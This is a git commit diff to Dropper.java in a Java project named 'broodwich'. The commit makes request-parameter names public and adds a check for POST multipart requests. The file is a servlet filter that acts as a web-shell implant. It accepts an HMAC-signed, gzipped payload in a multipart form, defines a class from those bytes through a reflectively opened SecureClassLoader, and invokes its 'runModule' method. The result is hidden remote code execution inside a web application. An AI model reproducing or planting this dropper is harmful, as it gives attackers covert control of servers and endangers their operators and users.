37ef91001863ba1adbfd31b4dfda30718c1eee8c
Brian Hysell <bdhysell@gmail.com>
2019-05-13 01:25:09 -0400

    make param names public & static; check if req is post & multipart

--- src/main/java/party/itistimeto/broodwich/Dropper.java
+++ src/main/java/party/itistimeto/broodwich/Dropper.java
@@ -11,14 +11,12 @@ package party.itistimeto.broodwich;
 
 public class Dropper implements javax.servlet.Filter {
     private final java.lang.String macAlgo = "HmacSHA256";
-    private final String digestKey = "broodwichDigest";
-    private final String moduleIdKey = "broodwichModuleId";
-    private final String modulesAttribute = "modules";
-    private final String runPayloadMethodName = "runPayload";
     private javax.crypto.SecretKey secretKey;
-    private final java.lang.String payloadKey = "broodwichCommand";
-    private final java.lang.String moduleParamsKey = "broodwichParams";
-    private final java.lang.String payloadLengthKey = "broodwichLength";
+    public static final java.lang.String digestKey = "broodwichDigest";
+    public static final java.lang.String moduleIdKey = "broodwichModuleId";
+    public static final java.lang.String payloadKey = "broodwichCommand";
+    public static final java.lang.String moduleParamsKey = "broodwichParams";
+    public static final java.lang.String payloadLengthKey = "broodwichLength";
     private static final java.lang.String filterName = "broodwich";
     private java.util.concurrent.ConcurrentMap<java.lang.String, java.lang.reflect.Method> modules;
 
@@ -94,85 +92,88 @@ public class Dropper implements javax.servlet.Filter {
     @Override
     public void doFilter(javax.servlet.ServletRequest servletRequest, javax.servlet.ServletResponse servletResponse, javax.servlet.FilterChain filterChain) throws java.io.IOException, javax.servlet.ServletException {
         // todo: multipart is only natively supported on servlet 3.0+
-        // decide if want to implement alternate method (e.g., apache commons, application/octet-stream)
+        // todo: decide if want to implement alternate method (e.g., apache commons, application/octet-stream)
         javax.servlet.http.HttpServletRequest httpServletRequest = (javax.servlet.http.HttpServletRequest) servletRequest;
-        java.util.Collection<javax.servlet.http.Part> parts = httpServletRequest.getParts();
-        if(!parts.isEmpty()) {
-            byte[] compressedPayload = null;
-            java.lang.String moduleId = null;
-            byte[] digest = null;
-            byte[] moduleParams = null;
-            int payloadLength = 0;
+        if (httpServletRequest.getMethod().equals("POST") && httpServletRequest.getContentType().equals("multipart/form-data")) {
+            // todo: handle "java.lang.IllegalStateException: Unable to process parts as no multi-part configuration has been provided"
+            java.util.Collection<javax.servlet.http.Part> parts = httpServletRequest.getParts();
+            if(!parts.isEmpty()) {
+                byte[] compressedPayload = null;
+                String moduleId = null;
+                byte[] digest = null;
+                byte[] moduleParams = null;
+                int payloadLength = 0;
 
-            for(javax.servlet.http.Part part : parts) {
-                switch (part.getName()) {
-                    case payloadKey:
-                        compressedPayload = new byte[(int)part.getSize()];
-                        new java.io.DataInputStream(part.getInputStream()).readFully(compressedPayload);
-                        break;
-                    case moduleIdKey:
-                        byte[] moduleIdBytes = new byte[(int)part.getSize()];
-                        new java.io.DataInputStream(part.getInputStream()).readFully(moduleIdBytes);
-                        moduleId = java.util.Arrays.toString(moduleIdBytes);
-                        break;
-                    case digestKey:
-                        digest = new byte[(int)part.getSize()];
-                        new java.io.DataInputStream(part.getInputStream()).readFully(digest);
-                        break;
-                    case moduleParamsKey:
-                        moduleParams = new byte[(int)part.getSize()];
-                        new java.io.DataInputStream(part.getInputStream()).readFully(moduleParams);
-                        break;
-                    case payloadLengthKey:
-                        byte[] payloadLengthBytes = new byte[(int)part.getSize()];
-                        new java.io.DataInputStream(part.getInputStream()).readFully(payloadLengthBytes);
-                        payloadLength = java.nio.ByteBuffer.wrap(payloadLengthBytes).order(java.nio.ByteOrder.BIG_ENDIAN).asIntBuffer().get();
-                        break;
-                }
-            }
-
-            if(compressedPayload != null && moduleId != null && digest != null && payloadLength > 0) {
-                try {
-                    javax.crypto.Mac mac = javax.crypto.Mac.getInstance(macAlgo);
-                    mac.init(secretKey);
-                    byte[] computedDigest = mac.doFinal(compressedPayload);
-
-                    // todo: timing attacks etc.
-                    if(java.util.Arrays.equals(computedDigest, digest)) {
-                        byte[] payload = new byte[payloadLength];
-                        new java.io.DataInputStream(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(compressedPayload))).readFully(payload);
-
-                        if(moduleId.equals("party.itistimeto.broodwich.modules.loader") && moduleParams != null) {
-                            try {
-                                // load class
-                                java.lang.Class sclClazz = java.security.SecureClassLoader.class;
-                                java.lang.reflect.Constructor sclConstructor = sclClazz.getDeclaredConstructor();
-                                sclConstructor.setAccessible(true);
-                                java.security.SecureClassLoader scl = (java.security.SecureClassLoader) sclConstructor.newInstance(null);
-                                java.lang.reflect.Method defineClass = sclClazz.getDeclaredMethod("defineClass", java.lang.String.class, java.nio.ByteBuffer.class, java.security.CodeSource.class);
-                                defineClass.setAccessible(true);
-                                Class moduleClass = (Class) defineClass.invoke(scl, java.util.Arrays.toString(moduleParams), java.nio.ByteBuffer.wrap(payload), null);
-
-                                try {
-                                    java.lang.reflect.Method runModule = moduleClass.getDeclaredMethod("runModule", byte[].class);
-                                    modules.put(moduleId, runModule);
-                                }
-                                catch (java.lang.NoSuchMethodException e) {
-                                    // idk
-                                }
-                            } catch (java.lang.NoSuchMethodException | java.lang.InstantiationException | java.lang.IllegalAccessException | java.lang.reflect.InvocationTargetException e) {
-                                e.printStackTrace();
-                            }
-                        }
-                        else {
-                            java.lang.reflect.Method runModule = modules.get(moduleId);
-                            if (runModule != null) {
-                                runModule.invoke(null, (Object) moduleParams);
-                            }
-                        }
+                for(javax.servlet.http.Part part : parts) {
+                    switch (part.getName()) {
+                        case payloadKey:
+                            compressedPayload = new byte[(int)part.getSize()];
+                            new java.io.DataInputStream(part.getInputStream()).readFully(compressedPayload);
+                            break;
+                        case moduleIdKey:
+                            byte[] moduleIdBytes = new byte[(int)part.getSize()];
+                            new java.io.DataInputStream(part.getInputStream()).readFully(moduleIdBytes);
+                            moduleId = java.util.Arrays.toString(moduleIdBytes);
+                            break;
+                        case digestKey:
+                            digest = new byte[(int)part.getSize()];
+                            new java.io.DataInputStream(part.getInputStream()).readFully(digest);
+                            break;
+                        case moduleParamsKey:
+                            moduleParams = new byte[(int)part.getSize()];
+                            new java.io.DataInputStream(part.getInputStream()).readFully(moduleParams);
+                            break;
+                        case payloadLengthKey:
+                            byte[] payloadLengthBytes = new byte[(int)part.getSize()];
+                            new java.io.DataInputStream(part.getInputStream()).readFully(payloadLengthBytes);
+                            payloadLength = java.nio.ByteBuffer.wrap(payloadLengthBytes).order(java.nio.ByteOrder.BIG_ENDIAN).asIntBuffer().get();
+                            break;
                     }
-                } catch (java.security.NoSuchAlgorithmException | java.security.InvalidKeyException | java.lang.IllegalAccessException | java.lang.reflect.InvocationTargetException e) {
-                    e.printStackTrace();
+                }
+
+                if(compressedPayload != null && moduleId != null && digest != null && payloadLength > 0) {
+                    try {
+                        javax.crypto.Mac mac = javax.crypto.Mac.getInstance(macAlgo);
+                        mac.init(secretKey);
+                        byte[] computedDigest = mac.doFinal(compressedPayload);
+
+                        // todo: timing attacks etc.
+                        if(java.util.Arrays.equals(computedDigest, digest)) {
+                            byte[] payload = new byte[payloadLength];
+                            new java.io.DataInputStream(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(compressedPayload))).readFully(payload);
+
+                            if(moduleId.equals("party.itistimeto.broodwich.modules.loader") && moduleParams != null) {
+                                try {
+                                    // load class
+                                    Class sclClazz = java.security.SecureClassLoader.class;
+                                    java.lang.reflect.Constructor sclConstructor = sclClazz.getDeclaredConstructor();
+                                    sclConstructor.setAccessible(true);
+                                    java.security.SecureClassLoader scl = (java.security.SecureClassLoader) sclConstructor.newInstance(null);
+                                    java.lang.reflect.Method defineClass = sclClazz.getDeclaredMethod("defineClass", String.class, java.nio.ByteBuffer.class, java.security.CodeSource.class);
+                                    defineClass.setAccessible(true);
+                                    Class moduleClass = (Class) defineClass.invoke(scl, java.util.Arrays.toString(moduleParams), java.nio.ByteBuffer.wrap(payload), null);
+
+                                    try {
+                                        java.lang.reflect.Method runModule = moduleClass.getDeclaredMethod("runModule", byte[].class);
+                                        modules.put(moduleId, runModule);
+                                    }
+                                    catch (NoSuchMethodException e) {
+                                        // idk
+                                    }
+                                } catch (NoSuchMethodException | InstantiationException | IllegalAccessException | java.lang.reflect.InvocationTargetException e) {
+                                    e.printStackTrace();
+                                }
+                            }
+                            else {
+                                java.lang.reflect.Method runModule = modules.get(moduleId);
+                                if (runModule != null) {
+                                    runModule.invoke(null, (Object) moduleParams);
+                                }
+                            }
+                        }
+                    } catch (java.security.NoSuchAlgorithmException | java.security.InvalidKeyException | IllegalAccessException | java.lang.reflect.InvocationTargetException e) {
+                        e.printStackTrace();
+                    }
                 }
             }
         }
